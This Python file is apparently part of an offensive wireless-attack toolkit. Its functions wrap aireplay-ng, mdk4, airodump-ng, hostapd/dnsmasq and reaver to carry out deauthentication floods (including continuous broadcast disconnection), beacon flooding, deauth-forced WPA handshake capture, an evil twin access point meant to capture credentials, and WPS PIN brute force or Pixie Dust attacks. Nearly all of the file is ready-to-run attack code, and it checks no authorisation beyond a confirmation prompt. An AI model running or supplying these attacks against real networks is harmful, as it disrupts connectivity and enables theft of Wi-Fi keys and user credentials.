"""
Attack Module
Handle various wireless attacks: deauth, evil twin, WPS, beacon flood, etc.
"""
import os
import time
import threading
import subprocess
from core.logger import Logger
from utils.helpers import run_command, ensure_root_privileges, validate_mac_address, validate_bssid, get_validated_input, get_user_confirmation

logger = Logger()

class AttackManager:
    def __init__(self):
        self.logger = logger
        self.active_attacks = {}
        self.attack_threads = {}

    def deauth_attack(self, bssid, client_mac=None, count=10, delay=0.1, interface=None):
        """
        Perform deauthentication attack using aireplay-ng
        """
        if not ensure_root_privileges():
            return False

        if not validate_bssid(bssid):
            self.logger.error("Invalid BSSID format")
            return False

        if client_mac and not validate_mac_address(client_mac):
            self.logger.error("Invalid client MAC format")
            return False

        if not interface:
            self.logger.error("Monitor interface required")
            return False

        self.logger.warning("Starting deauthentication attack...")
        self.logger.warning("This will disconnect devices from the network")
        self.logger.info(f"Target BSSID: {bssid}")
        if client_mac:
            self.logger.info(f"Target Client: {client_mac}")
        else:
            self.logger.info("Target: All clients (broadcast)")
        self.logger.info(f"Packet count: {count if count > 0 else 'infinite'}")
        self.logger.info(f"Delay: {delay} seconds")

        if not get_user_confirmation("Do you want to proceed with this attack?"):
            self.logger.info("Attack cancelled by user")
            return False

        # Build aireplay-ng command
        cmd = f"aireplay-ng --deauth {count} -a {bssid}"

        if client_mac and client_mac.lower() != 'all':
            cmd += f" -c {client_mac}"
        else:
            cmd += " -c FF:FF:FF:FF:FF:FF"  # Broadcast

        cmd += f" {interface}"

        if delay > 0:
            cmd += f" --delay {int(delay * 1000)}"  # Convert to milliseconds

        self.logger.info(f"Running: {cmd}")

        try:
            if count > 0:
                # Finite attack
                success, output, error = run_command(cmd, timeout=60)
                if success:
                    self.logger.success("Deauthentication attack completed")
                    return True
                else:
                    self.logger.error(f"Attack failed: {error}")
                    return False
            else:
                # Continuous attack in background
                attack_id = f"deauth_{bssid}_{client_mac or 'broadcast'}"
                self.logger.info("Starting continuous attack (Ctrl+C to stop)")

                def continuous_attack():
                    try:
                        while attack_id in self.active_attacks:
                            success, output, error = run_command(cmd, timeout=10)
                            if not success:
                                self.logger.error(f"Attack iteration failed: {error}")
                                break
                            time.sleep(delay)
                    except Exception as e:
                        self.logger.error(f"Continuous attack error: {e}")
                    finally:
                        if attack_id in self.active_attacks:
                            del self.active_attacks[attack_id]

                thread = threading.Thread(target=continuous_attack, daemon=True)
                self.active_attacks[attack_id] = True
                self.attack_threads[attack_id] = thread
                thread.start()

                self.logger.success("Continuous deauthentication attack started")
                self.logger.info("Press Ctrl+C to stop the attack")
                return True

        except KeyboardInterrupt:
            self.logger.info("Attack stopped by user")
            return True
        except Exception as e:
            self.logger.error(f"Attack error: {e}")
            return False

    def stop_attack(self, attack_id):
        """
        Stop a running attack
        """
        if attack_id in self.active_attacks:
            self.logger.info(f"Stopping attack: {attack_id}")
            del self.active_attacks[attack_id]
            if attack_id in self.attack_threads:
                # The thread should stop naturally when active_attacks is cleared
                del self.attack_threads[attack_id]
            self.logger.success("Attack stopped")
            return True
        else:
            self.logger.error(f"No active attack found with ID: {attack_id}")
            return False

    def list_active_attacks(self):
        """
        List currently running attacks
        """
        if not self.active_attacks:
            self.logger.info("No active attacks")
            return []

        self.logger.info("Active attacks:")
        attacks = list(self.active_attacks.keys())
        for i, attack in enumerate(attacks, 1):
            print(f"  {i}. {attack}")
        return attacks

    def stop_all_attacks(self):
        """
        Stop all running attacks
        """
        if not self.active_attacks:
            self.logger.info("No active attacks to stop")
            return True

        self.logger.info("Stopping all attacks...")
        attack_ids = list(self.active_attacks.keys())
        for attack_id in attack_ids:
            self.stop_attack(attack_id)

        self.logger.success("All attacks stopped")
        return True

    def beacon_flood(self, interface, ssid_list=None, count=1000, delay=0.1):
        """
        Perform beacon flood attack
        """
        if not ensure_root_privileges():
            return False

        if not interface:
            self.logger.error("Monitor interface required")
            return False

        self.logger.warning("Starting beacon flood attack...")
        self.logger.warning("This will flood the area with fake beacon frames")

        if not ssid_list:
            ssid_list = ["FakeNetwork1", "FakeNetwork2", "FreeWiFi", "TestNetwork"]

        self.logger.info(f"Interface: {interface}")
        self.logger.info(f"Fake SSIDs: {', '.join(ssid_list)}")
        self.logger.info(f"Beacon count per SSID: {count}")

        if not get_user_confirmation("Do you want to proceed with beacon flood?"):
            self.logger.info("Beacon flood cancelled by user")
            return False

        # Use mdk4 for beacon flooding
        cmd = f"mdk4 {interface} b -c {count}"

        # Add SSIDs
        for ssid in ssid_list:
            cmd += f' -s "{ssid}"'

        self.logger.info(f"Running: {cmd}")

        try:
            success, output, error = run_command(cmd, timeout=60)
            if success:
                self.logger.success("Beacon flood completed")
                return True
            else:
                self.logger.error(f"Beacon flood failed: {error}")
                return False
        except Exception as e:
            self.logger.error(f"Beacon flood error: {e}")
            return False

    def handshake_capture(self, bssid, channel, interface, output_file=None, deauth=True):
        """
        Capture WPA/WPA2 handshake
        """
        if not ensure_root_privileges():
            return False

        if not validate_bssid(bssid):
            self.logger.error("Invalid BSSID format")
            return False

        if not output_file:
            output_file = f"handshake_{bssid.replace(':', '')}"

        self.logger.info("Starting handshake capture...")
        self.logger.info(f"Target BSSID: {bssid}")
        self.logger.info(f"Channel: {channel}")
        self.logger.info(f"Output file: {output_file}.cap")

        if deauth:
            self.logger.info("Deauthentication will be used to force handshake capture")

        if not get_user_confirmation("Do you want to proceed with handshake capture?"):
            self.logger.info("Handshake capture cancelled by user")
            return False

        # Start airodump-ng to capture
        airodump_cmd = f"airodump-ng -c {channel} --bssid {bssid} -w {output_file} {interface}"

        self.logger.info(f"Starting capture: {airodump_cmd}")

        try:
            # Start capture in background
            capture_process = subprocess.Popen(
                airodump_cmd.split(),
                stdout=subprocess.PIPE,
                stderr=subprocess.PIPE,
                text=True
            )

            self.logger.success("Capture started. Waiting for handshake...")

            if deauth:
                # Perform deauth to force handshake
                time.sleep(2)  # Let capture start
                self.logger.info("Performing deauthentication to force handshake...")
                deauth_cmd = f"aireplay-ng --deauth 5 -a {bssid} {interface}"
                run_command(deauth_cmd, timeout=10)

            # Monitor for handshake
            handshake_found = False
            timeout = 60  # 1 minute timeout

            for i in range(timeout):
                if capture_process.poll() is not None:
                    break

                # Check if handshake file exists and has WPA handshake
                cap_file = f"{output_file}-01.cap"
                if os.path.exists(cap_file):
                    # Use aircrack-ng to check for handshake
                    check_cmd = f"aircrack-ng {cap_file} | grep -i 'wpa handshake'"
                    success, output, error = run_command(check_cmd, shell=True)
                    if "WPA handshake" in output:
                        handshake_found = True
                        break

                time.sleep(1)

            # Stop capture
            capture_process.terminate()
            try:
                capture_process.wait(timeout=5)
            except subprocess.TimeoutExpired:
                capture_process.kill()

            if handshake_found:
                self.logger.success("WPA handshake captured successfully!")
                self.logger.info(f"Handshake saved to: {cap_file}")
                return cap_file
            else:
                self.logger.warning("No WPA handshake captured within timeout period")
                self.logger.info(f"Capture data saved to: {cap_file}")
                return None

        except Exception as e:
            self.logger.error(f"Handshake capture error: {e}")
            return False

    def evil_twin_attack(self, target_ssid, target_bssid, channel, interface, dhcp=True):
        """
        Create an evil twin access point
        """
        if not ensure_root_privileges():
            return False

        self.logger.warning("Starting Evil Twin attack...")
        self.logger.warning("This creates a rogue access point to capture credentials")

        if not get_user_confirmation("Do you want to proceed with Evil Twin attack?"):
            self.logger.info("Evil Twin attack cancelled by user")
            return False

        try:
            # Create hostapd configuration
            hostapd_config = f"""interface={interface}
driver=nl80211
ssid={target_ssid}
hw_mode=g
channel={channel}
macaddr_acl=0
auth_algs=1
ignore_broadcast_ssid=0
"""

            config_file = "/tmp/hostapd_evil_twin.conf"
            with open(config_file, 'w') as f:
                f.write(hostapd_config)

            # Create dnsmasq configuration for DHCP
            dnsmasq_config = """interface=wlan0
dhcp-range=192.168.1.10,192.168.1.100,12h
dhcp-option=3,192.168.1.1
dhcp-option=6,8.8.8.8
server=8.8.4.4
log-queries
log-dhcp
listen-address=127.0.0.1
"""

            dnsmasq_file = "/tmp/dnsmasq_evil_twin.conf"
            with open(dnsmasq_file, 'w') as f:
                f.write(dnsmasq_config)

            # Start hostapd
            self.logger.info("Starting rogue access point...")
            hostapd_cmd = f"hostapd {config_file}"
            hostapd_process = subprocess.Popen(
                hostapd_cmd.split(),
                stdout=subprocess.PIPE,
                stderr=subprocess.PIPE,
                text=True
            )

            if dhcp:
                # Start dnsmasq for DHCP
                self.logger.info("Starting DHCP server...")
                dnsmasq_cmd = f"dnsmasq -C {dnsmasq_file}"
                dnsmasq_process = subprocess.Popen(
                    dnsmasq_cmd.split(),
                    stdout=subprocess.PIPE,
                    stderr=subprocess.PIPE,
                    text=True
                )

            self.logger.success("Evil Twin attack active!")
            self.logger.info("Monitor connected clients for captured credentials")
            self.logger.info("Press Ctrl+C to stop the attack")

            try:
                # Keep running until interrupted
                while True:
                    time.sleep(1)
            except KeyboardInterrupt:
                self.logger.info("Stopping Evil Twin attack...")

            # Cleanup
            hostapd_process.terminate()
            if dhcp:
                dnsmasq_process.terminate()

            try:
                hostapd_process.wait(timeout=5)
                if dhcp:
                    dnsmasq_process.wait(timeout=5)
            except subprocess.TimeoutExpired:
                hostapd_process.kill()
                if dhcp:
                    dnsmasq_process.kill()

            # Clean up config files
            try:
                os.unlink(config_file)
                os.unlink(dnsmasq_file)
            except:
                pass

            self.logger.success("Evil Twin attack stopped")
            return True

        except Exception as e:
            self.logger.error(f"Evil Twin attack error: {e}")
            return False

    def wps_attack(self, bssid, interface, pixie_dust=True):
        """
        Perform WPS attack using Reaver or Pixie Dust
        """
        if not ensure_root_privileges():
            return False

        if not validate_bssid(bssid):
            self.logger.error("Invalid BSSID format")
            return False

        self.logger.warning("Starting WPS attack...")
        self.logger.info(f"Target BSSID: {bssid}")

        if pixie_dust:
            self.logger.info("Using Pixie Dust attack (faster, more reliable)")
        else:
            self.logger.info("Using standard PIN brute force")

        if not get_user_confirmation("Do you want to proceed with WPS attack?"):
            self.logger.info("WPS attack cancelled by user")
            return False

        try:
            if pixie_dust:
                # Use Pixie Dust attack
                cmd = f"reaver -i {interface} -b {bssid} -vv -K 1"
            else:
                # Standard PIN brute force
                cmd = f"reaver -i {interface} -b {bssid} -vv"

            self.logger.info(f"Running: {cmd}")

            # Run the attack
            process = subprocess.Popen(
                cmd.split(),
                stdout=subprocess.PIPE,
                stderr=subprocess.STDOUT,
                text=True,
                bufsize=1,
                universal_newlines=True
            )

            pin_found = False
            psk_found = False

            # Monitor output for success
            while True:
                output = process.stdout.readline()
                if output == '' and process.poll() is not None:
                    break
                if output:
                    print(output.strip())
                    if "WPS PIN:" in output:
                        pin_found = True
                    if "WPA PSK:" in output:
                        psk_found = True

            rc = process.poll()

            if pin_found or psk_found:
                self.logger.success("WPS attack successful!")
                return True
            else:
                self.logger.warning("WPS attack completed but no PIN/PSK found")
                return False

        except KeyboardInterrupt:
            self.logger.info("WPS attack interrupted by user")
            if 'process' in locals():
                process.terminate()
            return False
        except Exception as e:
            self.logger.error(f"WPS attack error: {e}")
            return False

    def bluetooth_scan(self, interface=None, timeout=30):
        """
        Basic Bluetooth device scanning
        """
        if not ensure_root_privileges():
            return False

        self.logger.info("Starting Bluetooth device scan...")

        try:
            # Check if Bluetooth interface exists
            success, output, error = run_command("hcitool dev")
            if not success or "Devices:" not in output:
                self.logger.error("No Bluetooth adapters found")
                return False

            # Extract interface
            lines = output.split('\n')
            bt_interface = None
            for line in lines:
                if '\t' in line and 'hci' in line:
                    bt_interface = line.split('\t')[1]
                    break

            if not bt_interface:
                self.logger.error("Could not determine Bluetooth interface")
                return False

            self.logger.info(f"Using Bluetooth interface: {bt_interface}")

            # Perform inquiry scan
            self.logger.info(f"Scanning for {timeout} seconds...")
            cmd = f"hcitool -i {bt_interface} inq"

            success, output, error = run_command(cmd, timeout=timeout)
            if success:
                self.logger.success("Bluetooth scan completed")
                # Parse and display results
                devices = []
                lines = output.split('\n')
                for line in lines:
                    if line.strip() and '\t' in line:
                        parts = line.split('\t')
                        if len(parts) >= 3:
                            device = {
                                'bdaddr': parts[0].strip(),
                                'clock': parts[1].strip(),
                                'class': parts[2].strip()
                            }
                            devices.append(device)

                if devices:
                    print("\nFound Bluetooth devices:")
                    for i, device in enumerate(devices, 1):
                        print(f"{i}. Address: {device['bdaddr']}, Class: {device['class']}")
                else:
                    self.logger.info("No Bluetooth devices found")

                return devices
            else:
                self.logger.error(f"Bluetooth scan failed: {error}")
                return False

        except Exception as e:
            self.logger.error(f"Bluetooth scan error: {e}")
            return False

# Convenience functions
def deauth_attack(bssid, client_mac=None, count=10, delay=0.1, interface=None):
    """Convenience function for deauthentication attack"""
    manager = AttackManager()
    return manager.deauth_attack(bssid, client_mac, count, delay, interface)

def beacon_flood(interface, ssid_list=None, count=1000, delay=0.1):
    """Convenience function for beacon flood"""
    manager = AttackManager()
    return manager.beacon_flood(interface, ssid_list, count, delay)

def capture_handshake(bssid, channel, interface, output_file=None, deauth=True):
    """Convenience function for handshake capture"""
    manager = AttackManager()
    return manager.handshake_capture(bssid, channel, interface, output_file, deauth)